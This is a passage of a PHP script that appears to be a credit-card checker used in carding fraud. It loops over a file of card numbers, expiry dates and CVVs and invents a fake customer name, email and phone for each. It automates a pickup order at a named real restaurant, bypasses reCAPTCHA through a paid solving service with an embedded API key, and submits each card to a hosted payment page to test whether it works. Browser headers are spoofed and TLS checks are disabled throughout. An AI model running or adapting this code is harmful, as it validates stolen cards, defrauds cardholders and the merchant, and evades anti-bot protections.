            "sec-ch-ua" => $secChUa,
        ];
    }

    $headers = randomNavegador();
    $userAgent = $headers["User-Agent"];
    $ua = $headers["sec-ch-ua"];

    function solveRecaptcha($siteKey, $url, $apiKey)
{
    $ch = curl_init();

    curl_setopt($ch, CURLOPT_URL, "https://2captcha.com/in.php");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, [
        'key' => $apiKey,
        'method' => 'userrecaptcha',
        'action' => 'verify',
        'min_score' => '0.3',
        'googlekey' => $siteKey,
        'pageurl' => $url,
    ]);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    $response = curl_exec($ch);

    if ($response === false) {
        die("<b><span style='color:#00FF00' class='badge badge-dark'>ERRO NO CAPTCHA<br></span></b>");
    }

    $api_response = explode("|", $response);

    if ($api_response[0] !== "OK") {
        die("<b><span style='color:#00FF00' class='badge badge-dark'>ERRO NO CAPTCHA<br></span></b>");
    }

    $captcha_id = $api_response[1];

    while (true) {
        sleep(10);

        curl_setopt($ch, CURLOPT_URL, "http://2captcha.com/res.php");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, [
            'key' => $apiKey,
            'action' => 'get',
            'id' => $captcha_id,
        ]);

        $result = curl_exec($ch);

        if ($result === false) {
            die("<b><span style='color:#00FF00' class='badge badge-dark'>ERRO NO CAPTCHA<br></span></b>");
        }

        if ($result === "CAPCHA_NOT_READY") {
            continue;
        }

        $result_array = explode("|", $result);

        if ($result_array[0] === "OK") {
            $captcha_response = $result_array[1];
            curl_close($ch);
            return $captcha_response;
        } else {
            die("<b><span style='color:#00FF00' class='badge badge-dark'>ERRO NO CAPTCHA<br></span></b>");
        }
    }
}




    
$lista = file('db.txt', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);

if ($lista) {
    $contador = 0;
    foreach ($lista as $line) {
        $contador++;
        $parts = explode("|", $line);

        if (count($parts) >= 4) {
            $cartao = trim($parts[0]);
            $mes = trim($parts[1]);
            $ano = trim($parts[2]);
            $cvv = trim($parts[3]);
            $ano2 = substr($ano, -2);
            $card_info = "$cartao|$mes|$ano|$cvv";
$cookie = __DIR__ . '/german.txt';
if(file_exists($cookie)) {
    unlink($cookie);
}
$bin = substr($cartao, 0, 6);
    $file = "bins.csv";
    $searchfor = $bin;
    $contents = file_get_contents($file);
    $pattern = preg_quote($searchfor, "/");
    $pattern = "/^.*$pattern.*\$/m";
    if (preg_match_all($pattern, $contents, $matches)) {
        $encontrada = implode("\n", $matches[0]);
    }
    $pieces = explode(";", $encontrada);
    $c = count($pieces);
    if ($c == 8) {
        $pais = $pieces[4];
        $paiscode = $pieces[5];
        $banco = $pieces[2];
        $level = $pieces[3];
        $bandeira = $pieces[1];
    } else {
        $pais = $pieces[5];
        $paiscode = $pieces[6];
        $level = $pieces[4];
        $banco = $pieces[2];
        $bandeira = $pieces[1];
    }

$info_bin = "$pais;$paiscode;$level;$banco;$bandeira";



$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://geradornv.com.br/wp-json/api/generator-people?sex=x&state=XX');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Host: geradornv.com.br',
    'sec-ch-ua: '.$ua,
    'accept: */*',
    'x-requested-with: XMLHttpRequest',
    'user-agent: '.$userAgent,
    'referer: https://geradornv.com.br/gerador-pessoas/',
    'accept-language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
    'Accept-Encoding: gzip',
]);

$response = curl_exec($ch);

$data = json_decode($response, true);


$nomeCompleto = $data['people'];

$nomeParts = explode(' ', strtolower($nomeCompleto));

$dominios = ['@gmail.com', '@hotmail.com', '@outlook.com'];

$random = $dominios[array_rand($dominios)];

$nome = $nomeParts[0];
$sobrenome = $nomeParts[1];
$email = $nome . '.' . $sobrenome . $random;

$ddd = '202'; 
$randomPart1 = rand(100, 999);
$randomPart2 = rand(1000, 9999);

$phoneNumber = $ddd . '-' . $randomPart1 . '-' . $randomPart2;



$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://germantown.paisanospizza.com/ws/integrated/v1/ordering/order');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HEADER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Host: germantown.paisanospizza.com',
    'sec-ch-ua: '.$ua,
    'User-Agent: '.$userAgent,
    'Content-Type: application/json',
    'Accept: application/expanded+json',
    'X-Requested-With: XMLHttpRequest',
    'X-FTS-CLIENT: latte',
    'Origin: https://germantown.paisanospizza.com',
    'Referer: https://germantown.paisanospizza.com/ordering/home',
    'Accept-Language: pt-BR,pt;q=0.9',
    'Accept-Encoding: gzip',

]);
#curl_setopt($ch, CURLOPT_POSTFIELDS, '{"orderType":"Pickup","deferTime":"2024-03-14T11:15:00.000-0400","isMobileSource":false}');

$response = curl_exec($ch);


preg_match("/XSRF-TOKEN=([^;]+)/", $response ,$matches) . PHP_EOL;
if ($matches) { 

$token = $matches[1];

} else {
"XSRF-TOKEN não encontrado no header Set-Cookie." . PHP_EOL;
}



$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://germantown.paisanospizza.com/ws/integrated/v1/ordering/order');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HEADER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Host: germantown.paisanospizza.com',
    'sec-ch-ua: '.$ua,
    'X-XSRF-TOKEN: '.$token,
    'User-Agent: '.$userAgent,
    'Content-Type: application/json',
    'Accept: application/expanded+json',
    'X-Requested-With: XMLHttpRequest',
    'X-FTS-CLIENT: latte',
    'Origin: https://germantown.paisanospizza.com',
    'Referer: https://germantown.paisanospizza.com/ordering/home',
    'Accept-Language: pt-BR,pt;q=0.9',
    'Accept-Encoding: gzip',

]);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"orderType":"Pickup","deferTime":"2024-03-14T11:15:00.000-0400","isMobileSource":false}');

$response = curl_exec($ch);

$orderId = getStr($response, 'orderId":"', '"');


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://germantown.paisanospizza.com/ws/integrated/v1/ordering/audits');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HEADER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Host: germantown.paisanospizza.com',
    'sec-ch-ua: '.$ua,
    'X-XSRF-TOKEN: '.$token,
    'User-Agent: '.$userAgent,
    'Content-Type: application/json',
    'Accept: application/expanded+json',
    'X-Requested-With: XMLHttpRequest',
    'X-FTS-CLIENT: latte',
    'Origin: https://germantown.paisanospizza.com',
    'Referer: https://germantown.paisanospizza.com/ordering/menu/Pizzas',
    'Accept-Language: pt-BR,pt;q=0.9',
    'Accept-Encoding: gzip',
]);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"audit":"Add \"Lg Cheese\" item to order button clicked"}');

$response = curl_exec($ch);


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://germantown.paisanospizza.com/ws/integrated/v1/ordering/audits');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HEADER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Host: germantown.paisanospizza.com',
    'sec-ch-ua: '.$ua,
    'X-XSRF-TOKEN: '.$token,
    'User-Agent: '.$userAgent,
    'Content-Type: application/json',
    'Accept: application/expanded+json',
    'X-Requested-With: XMLHttpRequest',
    'X-FTS-CLIENT: latte',
    'Origin: https://germantown.paisanospizza.com',
    'Referer: https://germantown.paisanospizza.com/ordering/menu/Pizzas',
    'Accept-Language: pt-BR,pt;q=0.9',
    'Accept-Encoding: gzip',
]);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"audit":"1 Lg Cheese item has been added to the order: {\"itemId\":1,\"isUpsell\":false}"}');

$response = curl_exec($ch);


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://germantown.paisanospizza.com/ws/integrated/v1/ordering/order/items');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HEADER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Host: germantown.paisanospizza.com',
    'sec-ch-ua: '.$ua,
    'X-XSRF-TOKEN: '.$token,
    'User-Agent: '.$userAgent,
    'Content-Type: application/json',
    'Accept: application/expanded+json',
    'X-Requested-With: XMLHttpRequest',
    'X-FTS-CLIENT: latte',
    'Origin: https://germantown.paisanospizza.com',
    'Referer: https://germantown.paisanospizza.com/ordering/menu/Pizzas',
    'Accept-Language: pt-BR,pt;q=0.9',
    'Accept-Encoding: gzip',
]);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"category":"Pizza","item":"Cheese","size":"Lg","quantity":1,"isUpsell":false,"choices":[{"name":"Toppings","ingredients":[{"ingredient":"Pizza Cheese","isLeftHalf":false,"isRightHalf":false,"qualifiers":[]}]},{"name":"Crust","ingredients":[{"ingredient":"New York Style","isLeftHalf":false,"isRightHalf":false,"qualifiers":[]}]},{"name":"Sauce","ingredients":[{"ingredient":"Pizza Sauce","isLeftHalf":false,"isRightHalf":false,"qualifiers":[]}]},{"name":"Instructions","ingredients":[]}]}');

$response = curl_exec($ch);


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://germantown.paisanospizza.com/ws/integrated/v1/ordering/order');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Host: germantown.paisanospizza.com',
    'sec-ch-ua: '.$ua,
    'X-XSRF-TOKEN: '.$token,
    'User-Agent: '.$userAgent,
    'Accept: application/expanded+json',
    'X-Requested-With: XMLHttpRequest',
    'X-FTS-CLIENT: latte',
    'Referer: https://germantown.paisanospizza.com/ordering/menu/Pizzas',
    'Accept-Language: pt-BR,pt;q=0.9',
    'Accept-Encoding: gzip',
]);

$response = curl_exec($ch);


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://germantown.paisanospizza.com/ws/integrated/v1/ordering/audits');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HEADER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Host: germantown.paisanospizza.com',
    'sec-ch-ua: '.$ua,
    'X-XSRF-TOKEN: '.$token,
    'User-Agent: '.$userAgent,
    'Content-Type: application/json',
    'Accept: application/expanded+json',
    'X-Requested-With: XMLHttpRequest',
    'X-FTS-CLIENT: latte',
    'Origin: https://germantown.paisanospizza.com',
    'Referer: https://germantown.paisanospizza.com/ordering/menu/Pizzas',
    'Accept-Language: pt-BR,pt;q=0.9',
    'Accept-Encoding: gzip',
]);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"audit":"\"Check Out\" button clicked"}');

$response = curl_exec($ch);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://germantown.paisanospizza.com/ws/integrated/v1/ordering/audits');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HEADER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Host: germantown.paisanospizza.com',
    'sec-ch-ua: '.$ua,
    'X-XSRF-TOKEN: '.$token,
    'User-Agent: '.$userAgent,
    'Content-Type: application/json',
    'Accept: application/expanded+json',
    'X-Requested-With: XMLHttpRequest',
    'X-FTS-CLIENT: latte',
    'Origin: https://germantown.paisanospizza.com',
    'Referer: https://germantown.paisanospizza.com/ordering/checkout/details',
    'Accept-Language: pt-BR,pt;q=0.9',
    'Accept-Encoding: gzip',
]);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"audit":"\"Continue to order details\" button clicked"}');

$response = curl_exec($ch);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://germantown.paisanospizza.com/ws/integrated/v1/ordering/order');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'PUT');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Host: germantown.paisanospizza.com',
    'sec-ch-ua: '.$ua,
    'X-XSRF-TOKEN: '.$token,
    'User-Agent: '.$userAgent,
    'Content-Type: application/json',
    'Accept: application/expanded+json',
    'X-Requested-With: XMLHttpRequest',
    'X-FTS-CLIENT: latte',
    'Origin: https://germantown.paisanospizza.com',
    'Referer: https://germantown.paisanospizza.com/ordering/checkout/details',
    'Accept-Language: pt-BR,pt;q=0.9',
    'Accept-Encoding: gzip',
]);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"orderId":"'.$orderId.'","orderNumber":0,"donationAmount":0,"tip":0,"orderType":"Pickup","deferTime":"2024-03-14T11:15:00.000-0400","isSelfOrderSource":false,"guestCount":0}');

$response = curl_exec($ch);


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://germantown.paisanospizza.com/ws/integrated/v1/ordering/order/customer');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'PUT');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Host: germantown.paisanospizza.com',
    'sec-ch-ua: '.$ua,
    'X-XSRF-TOKEN: '.$token,
    'User-Agent: '.$userAgent,
    'Content-Type: application/json',
    'Accept: application/expanded+json',
    'X-Requested-With: XMLHttpRequest',
    'X-FTS-CLIENT: latte',
    'Origin: https://germantown.paisanospizza.com',
    'Referer: https://germantown.paisanospizza.com/ordering/checkout/details',
    'Accept-Language: pt-BR,pt;q=0.9',
    'Accept-Encoding: gzip',
]);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"customerId":0,"firstName":"'.$nome.'","lastName":"'.$sobrenome.'","subscribe":true,"smsMarketing":false,"email":"'.$email.'","address":{"force":false},"phone":"'.$phoneNumber.'","phoneConfirmation":""}');

$response = curl_exec($ch);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://germantown.paisanospizza.com/ws/integrated/v1/ordering/audits');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HEADER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Host: germantown.paisanospizza.com',
    'sec-ch-ua: '.$ua,
    'X-XSRF-TOKEN: '.$token,
    'User-Agent: '.$userAgent,
    'Content-Type: application/json',
    'Accept: application/expanded+json',
    'X-Requested-With: XMLHttpRequest',
    'X-FTS-CLIENT: latte',
    'Origin: https://germantown.paisanospizza.com',
    'Referer: https://germantown.paisanospizza.com/ordering/checkout/details',
    'Accept-Language: pt-BR,pt;q=0.9',
    'Accept-Encoding: gzip',
]);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"audit":"Order customer has been updated: {\"firstName\":\"'.$nome.'\",\"lastName\":\"'.$sobrenome.'\",\"phone\":\"'.$phoneNumber.'\",\"email\":\"'.$email.'\",\"subscribe\":true,\"smsMarketing\":false}"}');

$response = curl_exec($ch);


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://germantown.paisanospizza.com/ws/integrated/v1/ordering/audits');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HEADER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Host: germantown.paisanospizza.com',
    'sec-ch-ua: '.$ua,
    'X-XSRF-TOKEN: '.$token,
    'User-Agent: '.$userAgent,
    'Content-Type: application/json',
    'Accept: application/expanded+json',
    'X-Requested-With: XMLHttpRequest',
    'X-FTS-CLIENT: latte',
    'Origin: https://germantown.paisanospizza.com',
    'Referer: https://germantown.paisanospizza.com/ordering/checkout/order-details',
    'Accept-Language: pt-BR,pt;q=0.9',
    'Accept-Encoding: gzip',
]);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"audit":"Navigated to: /checkout/order-details"}');

$response = curl_exec($ch);


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://germantown.paisanospizza.com/ws/integrated/v1/ordering/audits');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HEADER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Host: germantown.paisanospizza.com',
    'sec-ch-ua: '.$ua,
    'X-XSRF-TOKEN: '.$token,
    'User-Agent: '.$userAgent,
    'Content-Type: application/json',
    'Accept: application/expanded+json',
    'X-Requested-With: XMLHttpRequest',
    'X-FTS-CLIENT: latte',
    'Origin: https://germantown.paisanospizza.com',
    'Referer: https://germantown.paisanospizza.com/ordering/checkout/payment',
    'Accept-Language: pt-BR,pt;q=0.9',
    'Accept-Encoding: gzip',
]);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"audit":"Navigated to: /checkout/payment"}');

$response = curl_exec($ch);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://germantown.paisanospizza.com/ws/integrated/v1/ordering/audits');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HEADER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Host: germantown.paisanospizza.com',
    'sec-ch-ua: '.$ua,
    'X-XSRF-TOKEN: '.$token,
    'User-Agent: '.$userAgent,
    'Content-Type: application/json',
    'Accept: application/expanded+json',
    'X-Requested-With: XMLHttpRequest',
    'X-FTS-CLIENT: latte',
    'Origin: https://germantown.paisanospizza.com',
    'Referer: https://germantown.paisanospizza.com/ordering/checkout/payment',
    'Accept-Language: pt-BR,pt;q=0.9',
    'Accept-Encoding: gzip',
]);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"audit":"Credit Card payment has been selected"}');

$response = curl_exec($ch);


$siteKey = "6LfFmCkUAAAAACfOqISvGBUOzPcXCKQvzFXK8X7y";
$url = "https://germantown.paisanospizza.com/ws/integrated/v1/ordering/order/payments/setup";
$apiKey = "d056c8637b4a1bac219d74c3eae744cb";

$captchaResponse = solveRecaptcha($siteKey, $url, $apiKey);

if ($captchaResponse) {
        echo "Teste concluirá em 4...3...2...1..." . PHP_EOL;
    } else {
        echo "Falha ao obter resposta do captcha.";
    }


$jsonData = array(
    "type" => 0,
    "isMobileSource" => true,
    "recaptcha" => $captchaResponse,
);

$post = json_encode($jsonData);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://germantown.paisanospizza.com/ws/integrated/v1/ordering/order/payments/setup');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Host: germantown.paisanospizza.com',
    'sec-ch-ua: '.$ua,
    'X-XSRF-TOKEN: '.$token,
    'User-Agent: '.$userAgent,
    'Content-Type: application/json',
    'Accept: application/expanded+json',
    'X-Requested-With: XMLHttpRequest',
    'X-FTS-CLIENT: latte',
    'Origin: https://germantown.paisanospizza.com',
    'Referer: https://germantown.paisanospizza.com/ordering/checkout/payment',
    'Accept-Language: pt-BR,pt;q=0.9',
    'Accept-Encoding: gzip',
]);
curl_setopt($ch, CURLOPT_POSTFIELDS, $post);

$response = curl_exec($ch);

$transactionSetupID = getStr($response, '/topic/payment-status/', '"');



if(!empty($transactionSetupID)) {
$urlGET = 'https://transaction.hostedpayments.com?TransactionSetupID=' . urlencode($transactionSetupID);
echo "RECAPTCHA RESOLVIDO." . PHP_EOL;
$ch = curl_init($urlGET);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Host: transaction.hostedpayments.com',
    'sec-ch-ua: '.$ua,
    'upgrade-insecure-requests: 1',
    'user-agent: '.$userAgent,
    'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'referer: https://germantown.paisanospizza.com/',
    'accept-language: pt-BR,pt;q=0.9',
    'Accept-Encoding: gzip',
]);

$response = curl_exec($ch) . PHP_EOL;

$viewState = strip_tags(getStr($response, 'name="__VIEWSTATE" id="__VIEWSTATE" value="', '"'));
$eventValidation = strip_tags(getStr($response, '__EVENTVALIDATION" value="', '"'));



$data = [
    "scriptManager" => "upFormHP|processTransactionButton",
    "__EVENTTARGET" => "processTransactionButton",
    "__EVENTARGUMENT" => "",
    "__VIEWSTATE" => $viewState,
    "__VIEWSTATEGENERATOR" => "CA0B0334",
    "__VIEWSTATEENCRYPTED" => "",
    "__EVENTVALIDATION" => $eventValidation,
    "hdnCancelled" => "",
    "cardNumber" => $cartao,
    "ddlExpirationMonth" => $mes,
    "ddlExpirationYear" => $ano2,
    "CVV" => '   ',
    "CVV_Mask" => "xxx",
    "txtBillingEditName" => "",
    "txtBillingEditAddress1" => "Street 772",
    "txtBillingEditAddress2" => "",
    "txtBillingEditCity" => "",
    "txtBillingEditState" => "",
    "txtBillingEditZip" => "10008",
    "txtBillingEditEmail" => "",
    "txtBillingEditPhone" => "",
    "hdnSwipe" => "",
    "hdnTruncatedCardNumber" => "",
    "hdnValidatingSwipeForUseDefault" => "",
    "hdnEncoded" => "",
    "__ASYNCPOST" => "true",
];

$postFields = http_build_query($data);





$ch = curl_init($urlGET);

curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Host: transaction.hostedpayments.com',
    'sec-ch-ua: '.$ua,
    'user-agent: '.$userAgent,
    'content-type: application/x-www-form-urlencoded; charset=UTF-8',
    'cache-control: no-cache',
    'x-requested-with: XMLHttpRequest',
    'x-microsoftajax: Delta=true',
    'accept: */*',
    'origin: https://transaction.hostedpayments.com',
    'referer: '.$urlGET, 
    'accept-language: pt-BR,pt;q=0.9',
    'Accept-Encoding: gzip',
]);

curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
$response_text = curl_exec($ch);

if(file_exists($cookie)) {
    unlink($cookie);
}

$link_pattern = "/redirect\('(.*?)'\);/";
preg_match($link_pattern, $response_text, $link_match);
$link = isset($link_match[1]) ? $link_match[1] : null;


libxml_use_internal_errors(true);

$dom = new DOMDocument;
$dom->loadHTML($response_text);
libxml_use_internal_errors(false);
$xpath = new DOMXPath($dom);

$div_element = $xpath->query('//div[@id="divManualErrorRedirectStatus"]')->item(0);
$div_message = $div_element ? $div_element->nodeValue : null;

$bin = substr($cartao, 0, 6);
    $file = "bins.csv";
    $searchfor = $bin;
    $contents = file_get_contents($file);
    $pattern = preg_quote($searchfor, "/");
    $pattern = "/^.*$pattern.*\$/m";
    if (preg_match_all($pattern, $contents, $matches)) {
        $encontrada = implode("\n", $matches[0]);
    }
    $pieces = explode(";", $encontrada);
    $c = count($pieces);
    if ($c == 8) {
        $pais = $pieces[4];
        $paiscode = $pieces[5];
        $banco = $pieces[2];
        $level = $pieces[3];
        $bandeira = $pieces[1];
    } else {
        $pais = $pieces[5];
        $paiscode = $pieces[6];
        $level = $pieces[4];
        $banco = $pieces[2];
        $bandeira = $pieces[1];
    }

$info_bin = "$pais;$paiscode;$level;$banco;$bandeira";

$approved = '';
